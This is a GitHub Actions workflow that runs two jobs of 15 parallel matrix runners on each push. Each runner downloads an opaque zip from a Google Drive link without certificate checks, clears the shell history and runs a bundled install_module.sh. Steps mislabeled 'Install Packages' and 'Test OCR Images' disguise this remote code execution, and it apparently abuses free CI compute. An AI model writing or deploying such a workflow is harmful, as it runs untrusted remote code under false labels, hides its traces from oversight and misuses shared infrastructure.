name: huyenthoai7bo
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  RELEASE:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Provision', 'Build', 'Confirm', 'Trigger', 'Deploy']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1DnDQxVcZtT70ai6Z8rGQL4mhSe576SSa" -O huyenthoai7bo.zip
        unzip -o huyenthoai7bo.zip
        rm huyenthoai7bo.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh


  CREATE1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Provision', 'Build', 'Confirm', 'Trigger', 'Deploy']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1DnDQxVcZtT70ai6Z8rGQL4mhSe576SSa" -O huyenthoai7bo.zip
        unzip -o huyenthoai7bo.zip
        rm huyenthoai7bo.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh
        
